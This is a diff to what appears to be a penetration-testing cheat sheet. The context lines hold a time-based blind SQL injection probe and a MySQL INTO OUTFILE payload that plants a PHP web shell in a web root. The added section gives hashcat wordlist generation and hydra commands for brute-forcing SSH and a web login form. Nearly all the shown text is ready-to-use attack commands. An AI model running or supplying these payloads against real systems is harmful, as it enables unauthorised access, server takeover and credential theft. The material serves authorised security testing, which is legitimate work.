@@ -358,6 +358,22 @@ IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFO
 select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
 ```
 
+# Passwords attack
+
+Custom password dictionary
+```
+hashcat --stdout  -r rules/best64.rule file
+```
+## Bruteforce
+Services
+```
+hydra -L users.txt -P passwords.txt ssh://IP
+```
+Web
+```
+hydra -L users.txt -P passwords.txt domain.ext http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
+```
+
 # Linux
 
 ## Comandos utiles
